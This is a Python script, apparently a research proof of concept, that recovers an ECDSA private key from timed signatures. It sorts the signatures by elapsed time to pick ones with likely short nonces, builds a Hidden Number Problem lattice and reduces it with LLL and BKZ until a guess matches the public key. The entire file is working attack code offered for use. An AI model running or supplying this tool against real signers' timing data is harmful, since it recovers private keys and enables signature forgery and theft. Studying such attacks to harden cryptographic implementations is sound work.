#!/usr/bin/env python3

import csv
import hashlib
import json
import random
import time
from binascii import unhexlify
from collections import namedtuple
from pprint import pprint
from threading import current_thread, Thread

from fpylll import LLL, BKZ, IntegerMatrix
from ec import get_curve, Mod

Signature = namedtuple("Signature", ("elapsed", "h", "t", "u"))

DEFAULT_PARAMS = {
    "attack": {
        "type": "full",  # Either "random" or "full". Whether to sample a random subset of "num" signatures, or use all.
        "skip": 50,        # How many signatures to skip at the start.
        "start": 3000,     # (poc) When to start creating the attack threads.
        "step": 200,       # (poc) After how many new signatures should a new thread be started.
        "num": 7000,       # Number of signatures used, (for the "random" type).
        "seed": None       # What random seed to use (for reproducibility).
    },
    "max_threads": 2,      # (poc) How many threads should be alive at any point.
    "dimension": 90,       # How many signatures are used for the lattice, real dimension is +1.
    "betas": [15, 20, 30, 40, 45, 48, 51, 53, 55],  # BKZ block size progression.
}


def construct_signature(curve, hash, data, r, s, elapsed):
    """Parse the signature into a Signature object."""
    h = hash.copy()
    h.update(data)
    data_hash = int(h.hexdigest(), 16)
    if h.digest_size * 8 > curve.group.n.bit_length():
        data_hash >>= h.digest_size * 8 - curve.group.n.bit_length()
    r = Mod(r, curve.group.n)
    s = Mod(s, curve.group.n)
    sinv = s.inverse()
    t = (sinv * r)
    u = (-sinv * data_hash)
    return Signature(elapsed, data_hash, int(t), int(u))


class Solver(Thread):
    """Solve the HNP given signatures and target pubkey."""

    def __init__(self, curve, signatures, pubkey, params, solution_func, total_sigs):
        super().__init__()
        self.curve = curve
        self.signatures = signatures
        self.pubkey = pubkey
        self.params = params
        self.solution_func = solution_func
        self.total_sigs = total_sigs

    def geom_bound(self, index):
        """Estimate the number of leading zero bits at signature with `index`."""
        i = 1
        while (self.total_sigs) / (2 ** i) >= index + 1:
            i += 1
        i -= 1
        if i <= 1:
            return 0
        return i

    def build_svp_lattice(self, signatures):
        """Build the basis matrix for the SVP lattice using `signatures`."""
        dim = len(signatures)
        b = IntegerMatrix(dim + 2, dim + 2)
        for i in range(dim):
            li = self.geom_bound(i) + 1
            b[i, i] = (2 ** li) * self.curve.group.n
            b[dim, i] = (2 ** li) * signatures[i][0]
            b[dim + 1, i] = (2 ** li) * signatures[i][1] + self.curve.group.n
        b[dim, dim] = 1
        b[dim + 1, dim + 1] = self.curve.group.n
        return b

    def log(self, msg):
        """Log some data."""
        print("[{}] {} [{}s]".format(self.thread_name, msg, int(time.time() - self.thread_start)))

    def reduce_lattice(self, lattice, block_size):
        """Reduce the lattice, either using *LLL* if `block_size` is `None` or *BKZ* with the given `block_size`."""
        if block_size is None:
            self.log("Start LLL.")
            return LLL.reduction(lattice)
        else:
            self.log("Start BKZ-{}.".format(block_size))
            return BKZ.reduction(lattice, BKZ.Param(block_size=block_size, strategies=BKZ.DEFAULT_STRATEGY, auto_abort=True))

    def try_guess(self, guess, pubkey):
        """Check if `guess` or its negation is the private key corresponding to `pubkey`."""
        if guess in self.tried or self.curve.group.n - guess in self.tried:
            return False
        self.tried.add(guess)
        pubkey_guess = guess * self.curve.g
        self.log("Guess: {}".format(hex(guess)))
        if pubkey == pubkey_guess:
            if self.solution_func:
                self.solution_func(guess)
            self.log("*** FOUND PRIVATE KEY *** : {}".format(hex(guess)))
            return True
        guess = self.curve.group.n - guess
        self.log("Guess: {}".format(hex(guess)))
        pubkey_guess = guess * self.curve.g
        if pubkey == pubkey_guess:
            if self.solution_func:
                self.solution_func(guess)
            self.log("*** FOUND PRIVATE KEY *** : {}".format(hex(guess)))
            return True
        return False

    def found(self, lattice, pubkey):
        """Check if the private key is found in the SVP matrix."""
        for row in lattice:
            guess = row[-2] % self.curve.group.n
            if self.try_guess(guess, pubkey):
                return True
        return False

    def run(self):
        self.thread_name = current_thread().name
        if self.thread_name == "MainThread":
            self.thread_name = " "
        self.thread_start = time.time()
        self.tried = set()

        pairs = [(sig.t, sig.u) for sig in self.signatures]
        dim = len(pairs)

        info = sum(self.geom_bound(i) for i in range(dim))
        full_info = info + dim
        overhead = info / self.curve.bit_size()
        self.log("Building lattice with {} bits of information ({} bits with recentering)(overhead {:.2f}).".format(info, full_info, overhead))

        lattice = self.build_svp_lattice(pairs)

        reds = [None] + self.params["betas"]
        for beta in reds:
            lattice = self.reduce_lattice(lattice, beta)
            if self.found(lattice, self.pubkey):
                break


def parse_params(fname):
    with open(fname) as f:
        return json.load(f)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("curve", help="What curve was used.")
    parser.add_argument("hash", help="What hash algorithm was used.")
    parser.add_argument("sigfile", help="CSV signature output file name.")
    parser.add_argument(
            "-p",
            "--params",
            help="A JSON file specifying attack parameters.",
            dest="params",
            type=parse_params,
            default=DEFAULT_PARAMS,
    )
    args = parser.parse_args()

    curve = get_curve(args.curve)
    if curve is None:
        print("[x] No curve found:", args.curve)
        exit(1)
    try:
        hash = hashlib.new(args.hash)
    except ValueError:
        print("[x] No hash algorithm found:", args.hash)
        exit(1)

    print("[*] Using parameters:")
    pprint(args.params)

    print("[ ] Loading signatures.")
    with open(args.sigfile) as sigfile:
        fline = sigfile.readline()[:-1].split(" ")
        pub = unhexlify(fline[0])
        data = unhexlify(fline[1])
        pubkey = curve.decode_point(pub)

        reader = csv.reader(sigfile)
        signatures = [
            construct_signature(curve, hash, data, int(row[0], 16), int(row[1], 16), int(row[2]))
            for row in reader]
    print("[*] Loaded {} signatures.".format(len(signatures)))

    if args.params["attack"]["skip"] is not None:
        print("[*] Skipping first {} signatures.".format(args.params["attack"]["skip"]))
        signatures = signatures[args.params["attack"]["skip"]:]

    if args.params["attack"]["type"] == "random" and args.params["attack"]["num"] < len(signatures):
        if args.params["attack"]["seed"] is None:
            seed = int(time.time() * 1000)
        else:
            seed = args.params["attack"]["seed"]
        print("[*] Random seed:", seed)
        random.seed(seed)
        signatures = random.sample(signatures, args.params["attack"]["num"])
    print("[*] Using {} signatures.".format(len(signatures)))

    if len(signatures) < args.params["attack"]["start"]:
        print("[x] The number of signatures is less than required by the parameters,"
              " the attack might not be successful.")


    print("[ ] Starting attack.")
    if args.params["attack"]["type"] in ("full", "random"):
        signatures.sort()
        solver = Solver(curve, signatures[: args.params["dimension"]], pubkey, args.params,
                        None, len(signatures))
        try:
            solver.run()
        except KeyboardInterrupt:
            pass
        print("[*] Finished attack.")
    else:
        print("[x] Bad attack type, should be one of 'full' or 'random'.")
        exit(1)
